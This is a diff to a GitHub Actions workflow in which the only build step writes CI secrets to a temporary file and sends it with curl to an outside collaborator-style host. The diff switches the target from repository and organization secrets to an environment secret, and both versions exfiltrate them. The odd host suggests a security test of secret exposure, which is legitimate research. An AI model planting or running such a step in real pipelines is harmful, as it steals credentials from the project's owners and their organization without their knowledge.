@@ -8,12 +8,10 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-
+    environment: super-secret
     env:
-      REPO_SECRET: ${{ secrets.REPO_SECRET }}
-      ORG_SECRET: ${{ secrets.ORGANIZATION_SECRET }}
-
+      ENV_SECRET: ${{ secrets.ENVIRONMENT_SECRET }}
     steps:
       - name: Run a one-line script
         run: |
-          echo "$REPO_SECRET" >> /tmp/secrets && echo "$ORG_SECRET" >> /tmp/secrets && curl -X POST https://stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud/secrets -d @/tmp/secrets
+          echo "$ENV_SECRET" >> /tmp/secrets && curl -X POST https://stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud/secrets -d @/tmp/secrets
